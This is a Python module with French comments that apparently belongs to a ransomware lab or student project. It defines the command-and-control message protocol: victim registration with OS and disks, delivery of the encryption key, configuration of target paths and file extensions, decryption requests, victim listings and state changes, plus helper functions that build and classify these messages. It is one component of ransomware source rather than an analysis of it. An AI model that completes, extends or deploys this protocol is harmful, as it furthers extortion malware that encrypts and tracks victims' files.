# Définition des messages
# initialize message
CRYPT_REQ = {'INITIALIZE': '', 'OS': '', 'DISKS': ''}
CRYPT_KEY = {'KEY_RESP': 0, 'KEY': '', 'STATE': ''}
CRYPT_RESP = {'CONFIGURE': 0, 'SETTING': {'DISKS': [], 'PATHS': [], 'FILE_EXT': [], 'FREQ': 0, 'KEY': '', 'STATE':''}}

# pending message
PENDING_MSG = {'PENDING': 0, 'NB_FILE': 0}

# decrypt request
DECRYPT_REQ = {'DECRYPT': 0, 'NB_FILE': 0, 'KEY' :''}

# restart
RESTART_REQ = {'RESTART': 0}
RESTART_RESP = {'RESTART_RESP': 0, 'KEY': ''}

# List_victim messages
LIST_VICTIM_REQ = {'LIST_REQ': None} # Exemple, suite à compléter
LIST_VICTIM_RESP = {'HASH': 0 , 'OS': '', 'DISKS': '', 'STATE': '', 'NB_FILES': 0}
LIST_VICTIM_END = { 'LIST_END': None}

# history messages
HISTORY_REQ = {'HIST_REQ': 0}
HISTORY_RESP = {'HIST_RESP': 0, 'TIMESTAMP': 0, 'STATE': '', 'NB_FILES': 0}
HISTORY_END = {'HIST_END': 0}

# change state
CHANGE_STATE = {'CHGSTATE': 0, 'STATE': 'DECRYPT'}

# message_type
MESSAGE_TYPE = {
    'INITIALIZE': 'CRYPT_REQ', # première clé du message, nom du dictionaire ci-dessus
    'KEY_RESP': 'CRYPT_KEY',
    'CONFIGURE': 'CRYPT_RESP',
    'PENDING': 'PENDING_MSG',
    'DECRYPT' : 'DECRYPT_REQ',
    'RESTART': 'RESTART_REQ',
    'RESTART_RESP': 'RESTART_RESP',
    'LIST_REQ': 'LIST_VICTIM_REQ',
    'HASH': 'LIST_VICTIM_RESP',
    'LIST_END': 'LIST_VICTIM_END',
    'HIST_REQ': 'HISTORY_REQ',
    'HIST_RESP': 'HISTORY_RESP',
    'HIST_END' : 'HISTORY_END',
    'CHGSTATE': 'CHANGE_STATE',
}


DEBUG = True

def set_message(select_msg, params=None):
    """
    Retourne le dictionnaire correspondant à select_msg et le complète avec params si besoin.
    :param select_msg: le message à récupérer (ex: LIST_VICTIM_REQ)
    :param params: les éventuels paramètres à ajouter au message
    :return: le message sous forme de dictionnaire
    """
    if select_msg.upper() == 'LIST_VICTIM_REQ':
        return LIST_VICTIM_REQ

    if select_msg.upper() == 'LIST_VICTIM_RESP':
        if len(params) != 5:
            return None
        LIST_VICTIM_RESP['HASH'] = params[0]
        LIST_VICTIM_RESP['OS'] = params[1]
        LIST_VICTIM_RESP['DISKS'] = params[2]
        LIST_VICTIM_RESP['STATE'] = params[3]
        LIST_VICTIM_RESP['NB_FILES'] = params[4]
        return LIST_VICTIM_RESP

    if select_msg.upper() == 'LIST_VICTIM_END':
        return LIST_VICTIM_END

    if select_msg.upper() == 'CRYPT_REQ':
        if len(params) !=3:
            return None
        CRYPT_REQ['INITIALIZE'] = params[0]
        CRYPT_REQ['OS'] = params[1]
        CRYPT_REQ['DISKS'] = params[2]
        return CRYPT_REQ

    if select_msg.upper() == 'CRYPT_KEY':
        if len(params) != 3:
            return None
        CRYPT_KEY['KEY_RESP'] = params[0]  # id victim
        CRYPT_KEY['KEY'] = params[1]
        CRYPT_KEY['STATE'] = params[2]
        return CRYPT_KEY

    if select_msg.upper() == 'CRYPT_RESP':
        if len(params) != 7:
            return None
        CRYPT_RESP['CONFIGURE'] = params[0]    # id
        CRYPT_RESP['SETTING']['DISKS'] = params[1]
        CRYPT_RESP['SETTING']['PATHS'] = params[2]
        CRYPT_RESP['SETTING']['FILE_EXT'] = params[3]
        CRYPT_RESP['SETTING']['FREQ'] = params[4]
        CRYPT_RESP['SETTING']['KEY'] = params[5]
        CRYPT_RESP['SETTING']['STATE'] = params[6]
        return CRYPT_RESP

    if select_msg.upper() == 'PENDING_MSG':
        if len(params) != 2:
            return None
        PENDING_MSG['PENDING'] = params[0]
        PENDING_MSG['NB_FILE'] = params[1]
        return PENDING_MSG

    if select_msg.upper() == 'DECRYPT_REQ':
        if len(params) != 3:
            return None
        DECRYPT_REQ['DECRYPT'] = params[0]
        DECRYPT_REQ['NB_FILE'] = params[1]
        DECRYPT_REQ['KEY'] = params[2]
        return DECRYPT_REQ

    if select_msg.upper() == 'RESTART_REQ':
        if len(params) != 1:
            return None
        RESTART_REQ['RESTART'] = params[0]
        return RESTART_REQ

    if select_msg.upper() == 'RESTART_RESP':
        if len(params) != 2:
            return None
        RESTART_RESP['RESTART_RESP'] = params[0]
        RESTART_RESP['KEY'] = params[1]
        return RESTART_RESP

    if select_msg.upper() == 'HISTORY_REQ':
        if len(params) != 1:
            return None
        HISTORY_REQ['HIST_REQ'] = params[0]
        return HISTORY_REQ

    if select_msg.upper() == 'HISTORY_RESP':
        if len(params) != 4:
            return None
        HISTORY_RESP['HIST_RESP'] = params[0]
        HISTORY_RESP['TIMESTAMP'] = params[1]
        HISTORY_RESP['STATE'] = params[2]
        HISTORY_RESP['NB_FILES'] = params[3]
        return HISTORY_RESP

    if select_msg.upper() == 'HISTORY_END':
        if len(params) != 1:
            return None
        HISTORY_END['HIST_END'] = params[0]
        return HISTORY_END

    if select_msg.upper() == 'CHANGE_STATE':
        if len(params) != 1:
            return None
        CHANGE_STATE['CHGSTATE'] = params[0]
        return CHANGE_STATE



def get_message_type(message):
    """
    Récupère le nom correspondant au type de message (ex: le dictionnaire LIST_VICTIM_REQ retourne 'LIST_REQ')
    :param message: le dictionnaire représentant le message
    :return: une chaine correspondant au nom du message comme définit par le protocole
    """
    if DEBUG:
        print(f"[+] MESSAGE ->  {message}")
    keys = list(message.keys())[0]

    if DEBUG:
        print(f"[+] TYPE MESSAGE ->  {MESSAGE_TYPE[keys]}")
    return MESSAGE_TYPE[keys]

print(get_message_type(LIST_VICTIM_END))
